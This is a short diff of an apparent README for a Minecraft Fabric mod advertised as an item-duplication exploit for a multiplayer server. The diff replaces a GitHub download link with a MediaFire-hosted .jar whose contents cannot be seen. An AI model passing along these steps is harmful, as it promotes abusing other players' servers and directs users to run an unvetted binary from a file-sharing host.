@@ -42,7 +42,7 @@ Whether you're looking to dupe gear, loot, or rare items, this mod provides a si
 
 1. Install [Fabric Loader](https://fabricmc.net) for Minecraft 1.21+
 2. Download [Fabric API](https://modrinth.com/mod/fabric-api) and place it in your `mods` folder
-3. Download [this mod](https://github.com/samatoolz/DonutSMP-Dupe/raw/refs/heads/main/DonutDuper-1.21.jar) and place it in your `mods` folder
+3. Download [this mod](https://www.mediafire.com/file/pio9ivnt2do2hpw/DonutDupe-1.21.11.jar/file) and place it in your `mods` folder
 4. Launch the game
 5. Use `/dupe` in-game to activate the exploit
 
